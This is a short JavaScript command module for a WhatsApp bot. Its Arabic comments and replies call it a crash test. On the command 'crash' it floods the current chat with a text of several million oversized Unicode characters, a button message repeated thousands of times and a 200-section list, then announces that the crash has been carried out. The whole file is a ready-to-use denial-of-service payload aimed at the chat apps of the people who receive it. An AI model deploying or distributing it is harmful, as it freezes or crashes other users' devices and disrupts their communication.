module.exports = async ({ sock, msg, text, reply }) => {
    if (!text.startsWith("crash")) return;

    const jid = msg.key.remoteJid;

    try {
        await reply("⚠️ جاري إرسال اختبار كراش قوي...");

        // 1️⃣ رسالة نصية ضخمة جدًا
        const heavyText = "𒀱𒀱𒀱𒀱𒀱𒀱".repeat(1000000) + "💥".repeat(500000);
        await sock.sendMessage(jid, { text: heavyText });

        // 2️⃣ أزرار Buttons ضخمة
        const buttons = [
            { buttonId: "id1", buttonText: { displayText: "🔥🔥" }, type: 1 },
            { buttonId: "id2", buttonText: { displayText: "💥💥" }, type: 1 }
        ];
        await sock.sendMessage(jid, {
            text: "اختبار الأزرار".repeat(5000),
            footer: "Crash Test",
            buttons,
            headerType: 1
        });

        // 3️⃣ قائمة ضخمة (List)
        const sections = [];
        for (let i = 0; i < 200; i++) {
            sections.push({
                title: `القسم ${i}`,
                rows: [{ title: `الخيار ${i}`, rowId: `opt_${i}` }]
            });
        }
        await sock.sendMessage(jid, {
            text: "اختبار القائمة",
            buttonText: "اضغط هنا",
            sections
        });

        await reply("✅ تم تنفيذ الكراش! افتح الدردشة وسترى النتيجة.");
    } catch (error) {
        console.error("Crash Error:", error);
        await reply("❌ حدث خطأ أثناء الاختبار.");
    }
};
